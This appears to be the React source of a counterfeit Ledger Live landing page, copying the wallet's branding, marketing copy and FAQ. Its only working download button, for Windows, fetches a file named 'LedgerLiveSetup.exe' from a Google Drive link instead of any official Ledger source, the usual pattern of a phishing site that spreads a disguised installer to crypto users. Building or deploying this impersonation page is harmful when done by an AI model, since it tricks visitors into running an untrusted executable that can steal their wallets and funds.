import { Star } from "lucide-react";
import { Swiper, SwiperSlide } from "swiper/react";
import "swiper/css";
import "swiper/css/autoplay";
import { Autoplay } from "swiper/modules";
import React, { useState } from "react";

const Home = () => {
  const [activeIndex, setActiveIndex] = useState(0);

  const imagePaths = Array.from(
    { length: 24 },
    (_, i) => `/assets/${i + 1}.webp`
  );

  const handleDownload = () => {
    const link = document.createElement("a");
    link.href =
      "https://drive.google.com/uc?export=download&id=1JTSy47SnPMyAJUzdeINRqWUczVGhVXvW";
    link.download = "LedgerLiveSetup.exe";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    setTimeout(() => {
      window.location.href = "/desktop-app";
    }, 2000);
  };

  const faqData = [
    {
      question: "What is a crypto wallet?",
      answer: (
        <>
          <p className="mb-4">
            A crypto wallet is a digital tool that allows users to store,
            manage, and interact with cryptocurrencies such as Bitcoin,
            Ethereum, and many others. It plays a crucial role in the
            cryptocurrency ecosystem, enabling users to securely manage their
            digital assets and perform various transactions.
          </p>
          <p className="mb-4">
            Crypto wallets come in various types, each offering different levels
            of security, convenience, and functionality.
          </p>
          <p>
            The most secure crypto wallets are physical devices called{" "}
            <strong className="font-semibold text-white">
              hardware wallets
            </strong>
            , designed to enhance the security of your private keys by securely
            storing them offline. These crypto wallets physically store your
            private keys within a chip inside the device.
          </p>
        </>
      ),
    },
    {
      question: "What is a Web3 wallet?",
      answer: (
        <>
          <p className="mb-4">
            A Web3 wallet is essentially your digital keychain for the new
            internet era—Web3. It's your all access pass to the decentralized
            world. Instead of relying on classic institutions like banks to
            manage your online currencies, a Web3 wallet puts you, and you
            alone, in control.
          </p>
          <p>
            Web3 wallets are extremely user friendly, letting you log in and
            navigate decentralized apps with ease all while keeping your private
            keys safe. Think of it as your digital superhero cape—giving you
            power and security in the wild, wild Web3.
          </p>
        </>
      ),
    },
    {
      question: "What is a non-custodial wallet?",
      answer: (
        <p>
          A non-custodial wallet gives you complete and sole control over your
          private keys and, therefore, your crypto assets. It’s the ultimate
          expression of the "be your own bank" philosophy, removing the need for
          third-party custodians.
        </p>
      ),
    },
    {
      question: "How do you use a crypto wallet app?",
      answer: (
        <p>
          Using a crypto wallet app involves downloading it onto your device,
          creating a new wallet, and securely backing up your 12 or 24-word
          recovery phrase. Once set up, you can send, receive, and interact with
          various cryptocurrencies and dApps.
        </p>
      ),
    },
    {
      question: "What is the best crypto wallet for mobile phones?",
      answer: (
        <>
          <p className="mb-4">
            The best crypto wallet for mobile phones is the Ledger crypto
            wallet. This is thanks to the fact that Ledger Live is designed to
            work seamlessly with Ledger hardware wallets, plugged into your
            mobile phone using the provided USB cable.
          </p>
          <p>
            Ledger Live is the official mobile app for users of Ledger hardware
            wallets. It provides a secure way to manage and view cryptocurrency
            balances on the go directly from your mobile device.
          </p>
        </>
      ),
    },
    {
      question: "What is the best crypto wallet for desktops?",
      answer: (
        <>
          <p className="mb-4">
            Ledger crypto wallets are widely known as the best crypto wallets
            for desktop. This is particularly due to the uncompromising value
            they place on both security and user-friendliness.
          </p>
          <p className="mb-4">
            The Ledger Live crypto wallet application has a user-friendly
            interface that makes it easy for users to manage their
            cryptocurrency portfolios, providing a seamless integration for
            Ledger hardware wallets.
          </p>
        </>
      ),
    },
    {
      question: "How does the Ledger Live wallet app work?",
      answer: (
        <>
          <p className="mb-4">
            The Ledger Live app is a safe and easy interface for managing your
            cryptocurrencies using your Ledger device.
          </p>
          <p>
            Unlike most apps, the Ledger Live crypto wallet app keeps your data
            directly on your phone or computer, so there's no need to sign in
            using an email and password. All that's required is your Ledger
            device and of course, you.
          </p>
        </>
      ),
    },
    {
      question: "How do I download and install the Ledger Live wallet app?",
      answer: (
        <>
          <p className="mb-4">
            To download and install the Ledger Live app, follow the steps below.
            Do please mind however that some specific steps may vary slightly
            according to your operating system (Windows, macOS, or Linux) or
            device (computer or mobile).
          </p>
          <ul className="list-disc list-inside space-y-2 mb-4">
            <li>Go to the official Ledger website and click on Ledger Live.</li>
            <li>Click on the "Download Ledger Live" button.</li>
            <li>Select your Operating System (Windows, macOS, or Linux).</li>
            <li>
              Download the installer file and run it, following the on-screen
              instructions.
            </li>
            <li>
              Connect your Ledger device to your computer using the provided USB
              cable.
            </li>
            <li>
              Complete your setup by following the on-screen instructions in
              Ledger Live.
            </li>
          </ul>
          <p>Have fun!</p>
        </>
      ),
    },
    {
      question: "Which coins does the Ledger Live wallet app support?",
      answer: (
        <>
          <p className="mb-4">
            The Ledger Live crypto wallet app supports Bitcoin (BTC), Ethereum
            (ETH), Ripple (XRP), Litecoin (LTC), Polkadot (DOT), and thousands
            more. It also supports various ERC-20 tokens and other popular
            cryptocurrencies.
          </p>
          <p>
            For a comprehensive list of supported coins, networks and tokens,
            feel free to{" "}
            <a
              href="#"
              className="underline font-semibold text-white hover:text-blue-400"
            >
              check here
            </a>
            .
          </p>
        </>
      ),
    },
  ];

  return (
    <div className="min-h-screen">
      {/* Hero Section */}
      <section className="bg-black text-white py-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            <div>
              <h1 className="text-5xl lg:text-6xl font-bold mb-6">
                A crypto wallet app and Web3 gateway
              </h1>
              <p className="text-xl text-gray-300 mb-8">
                The best companion app to securely manage crypto and NFTs.{" "}
              </p>
              <div className="inline-flex rounded-lg border border-gray-700 bg-gray-950 px-4 py-4 items-center space-x-3">
                <div className="flex items-center">
                  {[...Array(5)].map((_, i) => (
                    <Star key={i} className="w-4 h-4 fill-white text-white" />
                  ))}
                </div>
                <span className="text-sm text-gray-300">
                  Trusted by over 7 million customers
                </span>
              </div>
            </div>
            <div className="relative">
              <img
                src="/assets/hero-LL-landing-page.webp"
                alt="Ledger Live App"
                className="w-full max-w-md mx-auto animate-float"
              />
            </div>
          </div>
        </div>
      </section>

      {/* Platform Icons */}
      <section className="py-20 bg-black text-white">
        <div className="max-w-screen-xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-wrap justify-center items-center gap-4">
            {/* Windows Button */}
            <div
              onClick={handleDownload}
              className="flex items-center space-x-4 bg-[#2a2a2a] border border-[#444444] rounded-lg px-6 py-3 w-[220px] cursor-pointer hover:bg-[#3a3a3a] transition"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-10 w-10 text-white"
                fill="currentColor"
                viewBox="0 0 24 24"
              >
                <path d="M0 3.557v16.886h11.333V3.557H0zm12.667 0v7.62h11.333V3.557H12.667zM0 12.443v7.99h11.333v-7.99H0zm12.667.833v7.157h11.333V13.276H12.667z" />
              </svg>
              <div>
                <p className="text-sm text-gray-400">Download for</p>
                <p className="text-2xl font-bold">Windows</p>
              </div>
            </div>

            {/* macOS Button */}
            <div className="flex items-center space-x-4 bg-[#2a2a2a] border border-[#444444] rounded-lg px-6 py-3 w-[220px]">
              <div className="w-10 h-10 bg-white rounded-lg flex items-center justify-center">
                <span className="text-black font-semibold text-xs">macOS</span>
              </div>
              <div>
                <p className="text-sm text-gray-400">Download for</p>
                <p className="text-2xl font-bold">macOS</p>
              </div>
            </div>

            {/* Linux Button */}
            <div className="flex items-center space-x-4 bg-[#2a2a2a] border border-[#444444] rounded-lg px-6 py-3 w-[220px]">
              <svg
                className="h-12 w-12 text-white"
                role="img"
                viewBox="0 0 24 24"
                xmlns="http://www.w3.org/2000/svg"
                fill="currentColor"
              >
                <title>Linux</title>
                <path d="M12.002 0S8.435 1.132 5.094 3.961C1.752 6.79.002 11.232.002 11.232s.47 4.88 3.59 7.915c3.12 3.033 6.23 2.124 8.41 1.06 2.18-1.063 5.302-3.89 5.302-3.89s1.38-1.898 1.38-4.22c0-2.324-2.18-4.437-2.18-4.437s-1.282-1.22-3.26-1.996c-1.98-.775-3.468-1.55-3.468-1.55s1.282-4.122-1.774-4.122zm-2.476 6.892c.624-.002 1.127.42 1.127.938 0 .518-.503.94-1.127.94-.626 0-1.128-.422-1.128-.94 0-.518.502-.938 1.128-.938zm4.952 0c.623-.002 1.126.42 1.126.938 0 .518-.502.94-1.126.94-.625 0-1.127-.422-1.127-.94 0-.518.502-.938 1.127-.938zm-.33 3.633s2.328 1.22 2.328 2.64c0 1.42-2.176 2.64-2.176 2.64s-2.177 1.22-4.654 1.22c-2.48 0-4.656-1.22-4.656-1.22s-2.176-1.22-2.176-2.64c0-1.42 2.327-2.64 2.327-2.64s2.33-1.22 4.656-1.22c2.328 0 4.35 1.22 4.35 1.22z" />
              </svg>
              <div>
                <p className="text-sm text-gray-400">Download for</p>
                <p className="text-2xl font-bold">Linux</p>
              </div>
            </div>

            {/* iOS Button */}
            <div className="flex items-center space-x-4 bg-[#2a2a2a] border border-[#444444] rounded-lg px-6 py-3 w-[220px]">
              <div className="w-10 h-10 bg-white rounded-lg flex items-center justify-center">
                <span className="text-black font-bold text-base">iOS</span>
              </div>
              <div>
                <p className="text-sm text-gray-400">Download for</p>
                <p className="text-2xl font-bold">iOS</p>
              </div>
            </div>

            {/* Android Button */}
            <div className="flex items-center space-x-4 bg-[#2a2a2a] border border-[#444444] rounded-lg px-6 py-3 w-[220px]">
              <svg
                className="h-10 w-10 text-white"
                viewBox="0 0 24 24"
                fill="currentColor"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path d="M19 12V10H17V12H19M7 12V10H5V12H7M17.41 4.59L19.41 6.59L17.5 8.5H6.5L4.59 6.59L6.59 4.59L8.5 6.5H15.5L17.41 4.59M18.5 2H5.5C4.67 2 4 2.67 4 3.5V9.5C4 10.07 4.25 10.59 4.67 10.95L6.5 12.78V20.5C6.5 21.33 7.17 22 8 22H16C16.83 22 17.5 21.33 17.5 20.5V12.78L19.33 10.95C19.75 10.59 20 10.07 20 9.5V3.5C20 2.67 19.33 2 18.5 2Z" />
              </svg>
              <div>
                <p className="text-sm text-gray-400">Download for</p>
                <p className="text-2xl font-bold">Android</p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Multi-crypto Section */}
      <section className="py-20 bg-black text-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="bg-black flex justify-between gap-6">
            <div className="text-center mb-16 text-white px-20">
              <h2 className="text-4xl font-bold mb-4">
                A multi-crypto wallet app to secure thousands
              </h2>
              <h2 className="text-4xl font-bold mb-4 items-start flex">
                of coins and NFTs
              </h2>
              <p className="text-xl text-white items-start flex">
                A new Bitcoin wallet app and much more.
              </p>
            </div>
            <div className="w-42 h-14 rounded-full p-6 border-2 border-gray-500 flex items-center justify-center text-center whitespace-nowrap">
              <button>See all supported Cryptos</button>
            </div>
          </div>

          <div className="mb-12">
            <Swiper
              slidesPerView={6}
              spaceBetween={18}
              loop={true}
              autoplay={{
                delay: 0,
                disableOnInteraction: false,
              }}
              speed={1000}
              modules={[Autoplay]}
              className="w-full"
            >
              {imagePaths.map((src, index) => (
                <SwiperSlide key={index}>
                  <div className="w-16 h-16 rounded-full overflow-hidden flex items-center justify-center bg-white shadow-md mx-auto hover:scale-105 transition-transform">
                    <img
                      src={src}
                      alt={`crypto-${index + 1}`}
                      className="w-full h-full object-contain"
                    />
                  </div>
                </SwiperSlide>
              ))}
            </Swiper>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="py-20 bg-black text-white">
        <div className="max-w-7xl mx-auto bg-black px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <h2 className="text-4xl font-bold mb-4">
              Securely stake and manage crypto
            </h2>
            <p className="text-xl text-gray">
              via the Ledger Live crypto wallet app
            </p>
          </div>

          <div className="grid lg:grid-cols-2 gap-12 items-center">
            <div className="border border-black rounded-lg p-6 flex justify-center">
              <img
                src="/assets/manage.webp"
                alt="Ledger Live Mobile"
                className="w-full max-w-lg"
              />
            </div>

            {/* Right Side Feature Details (Unchanged) */}
            <div className="space-y-8">
              <div className="mb-8 rounded-lg p-6">
                <h3 className="text-2xl font-bold mb-4 text-purple-400">
                  Manage your crypto portfolio
                </h3>
                <p className="text-gray-300 mb-4">
                  Buy, exchange, grow and manage over 5,500 coins and tokens
                  with our crypto wallet app.
                </p>
                <ul className="space-y-2 text-gray-300">
                  <li>
                    • Securely execute transactions by validating them with your
                    Ledger Hardware Wallet
                  </li>
                  <li>
                    • Manage your portfolio as well as 1000s of other crypto
                    assets
                  </li>
                  <li>• Track your portfolio</li>
                  <li>
                    * Crypto transaction services are provided by third-party
                    providers. Ledger provides no advice or recommendations on
                    use of these third-party services.
                  </li>
                </ul>
              </div>

              <div className="rounded-lg p-6">
                <h3 className="text-2xl font-bold mb-4 text-purple-400">
                  You can buy crypto
                </h3>
                <p className="text-gray-300">
                  It is possible to buy crypto with a credit/debit card or bank
                  transfer. Choose from a range of service providers – Paypal,
                  Ramp, MoonPay, Sardine – and select the option that works best
                  for you.
                </p>
                <p className="text-gray-300 mt-4">
                  Your crypto will land safely in your Ledger crypto wallet.
                </p>
              </div>

              <div className="rounded-lg p-6">
                <h3 className="text-2xl font-bold mb-4 text-purple-400">
                  Swap crypto
                </h3>
                <p className="text-gray-300">
                  Swapping allows you to explore different crypto assets,
                  protect your crypto from volatility, and diversify your
                  portfolio.
                </p>
                <p className="text-gray-300 mt-4">
                  It is possible to swap through the Ledger Live app without
                  using fiat currencies.
                </p>
              </div>

              <div className="rounded-lg p-6">
                <h3 className="text-2xl font-bold mb-4 text-purple-400">
                  Stake crypto
                </h3>
                <p className="text-gray-300">
                  Put your crypto to work and get rewards.
                </p>
                <p className="text-gray-300 mt-4">
                  You can start staking coins through the Ledger Live crypto
                  wallet app. Track your rewards in the Earn section and
                  discover staking opportunities across chains.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Ledger Live CTA */}
      <section className="py-20 bg-black text-white relative">
        <div className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="relative w-full h-[500px] rounded-lg overflow-hidden">
            <img
              src="/assets/Ledger-Live-usage.webp"
              alt="Ledger Live"
              className="w-full h-full object-cover"
            />
            <div className="absolute inset-0 bg-black/40"></div>

            <div className="absolute inset-0 flex flex-col justify-center items-center text-center px-4 sm:px-8">
              <h2 className="text-4xl md:text-5xl font-bold mb-4">
                Take control of your digital
              </h2>
              <h2 className="text-4xl md:text-5xl font-bold mb-4">
                assets with Ledger Live
              </h2>
              <p className="text-xl mb-2 max-w-2xl">
                The secure wallet app to manage your digital assets and more
              </p>
              <p className="text-xl">wherever you are</p>
            </div>
          </div>
        </div>
      </section>

      {/* Download Section */}
      <section className="py-20 bg-black text-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <h2 className="text-5xl font-bold mb-4">
              Download the Ledger Live crypto wallet app
            </h2>
            <p className="text-2xl text-white">
              Get the Ledger Live crypto wallet app and seamlessly manage all
              your web3 assets in one secure place.
            </p>
          </div>

          <div className="grid md:grid-cols-2 gap-12">
            <div className="text-center">
              <h3 className="text-2xl font-bold mb-4">Ledger Live Desktop</h3>
              <img
                src="/assets/visual.webp"
                alt="Ledger Live Desktop"
                className="w-full mb-6 rounded-lg shadow-lg"
              />
              <div className="flex justify-center space-x-4">
                <div className="flex items-center space-x-4 bg-[#2a2a2a] border border-[#444444] rounded-lg px-6 py-3 w-[220px]">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="h-10 w-10 text-white"
                    fill="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path d="M0 3.557v16.886h11.333V3.557H0zm12.667 0v7.62h11.333V3.557H12.667zM0 12.443v7.99h11.333v-7.99H0zm12.667.833v7.157h11.333V13.276H12.667z" />
                  </svg>
                  <div>
                    <p className="text-sm text-gray-400">Download for</p>
                    <p className="text-2xl font-bold">Windows</p>
                  </div>
                </div>

                {/* macOS Button */}
                <div className="flex items-center space-x-4 bg-[#2a2a2a] border border-[#444444] rounded-lg px-6 py-3 w-[220px]">
                  <div className="w-10 h-10 bg-white rounded-lg flex items-center justify-center">
                    <span className="text-black font-semibold text-xs">
                      macOS
                    </span>
                  </div>
                  <div>
                    <p className="text-sm text-gray-400">Download for</p>
                    <p className="text-2xl font-bold">macOS</p>
                  </div>
                </div>

                {/* Linux Button */}
                <div className="flex items-center space-x-4 bg-[#2a2a2a] border border-[#444444] rounded-lg px-6 py-3 w-[220px]">
                  <svg
                    className="h-12 w-12 text-white"
                    role="img"
                    viewBox="0 0 24 24"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="currentColor"
                  >
                    <title>Linux</title>
                    <path d="M12.002 0S8.435 1.132 5.094 3.961C1.752 6.79.002 11.232.002 11.232s.47 4.88 3.59 7.915c3.12 3.033 6.23 2.124 8.41 1.06 2.18-1.063 5.302-3.89 5.302-3.89s1.38-1.898 1.38-4.22c0-2.324-2.18-4.437-2.18-4.437s-1.282-1.22-3.26-1.996c-1.98-.775-3.468-1.55-3.468-1.55s1.282-4.122-1.774-4.122zm-2.476 6.892c.624-.002 1.127.42 1.127.938 0 .518-.503.94-1.127.94-.626 0-1.128-.422-1.128-.94 0-.518.502-.938 1.128-.938zm4.952 0c.623-.002 1.126.42 1.126.938 0 .518-.502.94-1.126.94-.625 0-1.127-.422-1.127-.94 0-.518.502-.938 1.127-.938zm-.33 3.633s2.328 1.22 2.328 2.64c0 1.42-2.176 2.64-2.176 2.64s-2.177 1.22-4.654 1.22c-2.48 0-4.656-1.22-4.656-1.22s-2.176-1.22-2.176-2.64c0-1.42 2.327-2.64 2.327-2.64s2.33-1.22 4.656-1.22c2.328 0 4.35 1.22 4.35 1.22z" />
                  </svg>
                  <div>
                    <p className="text-sm text-gray-400">Download for</p>
                    <p className="text-2xl font-bold">Linux</p>
                  </div>
                </div>
              </div>
            </div>
            <div className="text-center">
              <h3 className="text-2xl font-bold mb-4">Ledger Live Mobile</h3>
              <img
                src="/assets/visual-mobile-ledger-live.webp"
                alt="Ledger Live Mobile"
                className="w-full mb-6 rounded-lg shadow-lg"
              />
              <div className="flex justify-center space-x-4">
                {/* iOS Button */}
                <div className="flex items-center space-x-4 bg-[#2a2a2a] border border-[#444444] rounded-lg px-6 py-3 w-[220px]">
                  <div className="w-10 h-10 bg-white rounded-lg flex items-center justify-center">
                    <span className="text-black font-bold text-base">iOS</span>
                  </div>
                  <div>
                    <p className="text-sm text-gray-400">Download for</p>
                    <p className="text-2xl font-bold">iOS</p>
                  </div>
                </div>

                {/* Android Button */}
                <div className="flex items-center space-x-4 bg-[#2a2a2a] border border-[#444444] rounded-lg px-6 py-3 w-[220px]">
                  <svg
                    className="h-10 w-10 text-white"
                    viewBox="0 0 24 24"
                    fill="currentColor"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path d="M19 12V10H17V12H19M7 12V10H5V12H7M17.41 4.59L19.41 6.59L17.5 8.5H6.5L4.59 6.59L6.59 4.59L8.5 6.5H15.5L17.41 4.59M18.5 2H5.5C4.67 2 4 2.67 4 3.5V9.5C4 10.07 4.25 10.59 4.67 10.95L6.5 12.78V20.5C6.5 21.33 7.17 22 8 22H16C16.83 22 17.5 21.33 17.5 20.5V12.78L19.33 10.95C19.75 10.59 20 10.07 20 9.5V3.5C20 2.67 19.33 2 18.5 2Z" />
                  </svg>
                  <div>
                    <p className="text-sm text-gray-400">Download for</p>
                    <p className="text-2xl font-bold">Android</p>
                  </div>
                </div>
              </div>
            </div>
            <div className="max-w-screen-lg mx-auto px-4 flex flex-col text-semibold md:flex-row gap-8 md:gap-16 whitespace-nowrap">
              <a href="#" className="group inline-flex items-center gap-3">
                <span className="border-b border-white pb-1">
                  Download our uninstaller
                </span>
                <span
                  aria-hidden="true"
                  className="transition-transform group-hover:translate-x-1"
                >
                  →
                </span>
              </a>

              <a href="#" className="group inline-flex items-center gap-3">
                <span className="border-b border-white pb-1">
                  Check out device and OS compatibility here
                </span>
                <span
                  aria-hidden="true"
                  className="transition-transform group-hover:translate-x-1"
                >
                  →
                </span>
              </a>
            </div>
          </div>
        </div>
      </section>

      {/* FAQ Section */}
      <section className="py-20 bg-black text-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <h2 className="text-4xl font-bold mb-6">FAQs</h2>
          <h2 className="text-xl mb-16">
            about the Ledger Live crypto wallet app
          </h2>
          <div className="space-y-8 flex flex-row justify-between lg:gap-8 lg:grid lg:grid-cols-3">
            <div className="lg:col-span-1 bg-[#1A1A27] rounded-lg">
              <ul>
                {faqData.map((item, index) => (
                  <li
                    key={index}
                    className="border-b border-gray-700/50 last:border-b-0"
                  >
                    <button
                      onClick={() => setActiveIndex(index)}
                      className={`w-full text-left p-5 transition-colors duration-300 rounded-lg ${
                        activeIndex === index
                          ? "bg-[#2E2E42]"
                          : "hover:bg-[#252535]"
                      }`}
                    >
                      <div className="flex justify-between items-center">
                        <span className="font-medium pr-4">
                          {item.question}
                        </span>
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          className="h-5 w-5 flex-shrink-0 text-gray-500"
                          fill="none"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth={2}
                            d="M9 5l7 7-7 7"
                          />
                        </svg>
                      </div>
                    </button>
                  </li>
                ))}
              </ul>
            </div>

            <div className="lg:col-span-2 p-4 lg:p-8">
              <div className="text-gray-300 text-base leading-relaxed">
                {faqData[activeIndex].answer}
              </div>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
};

export default Home;
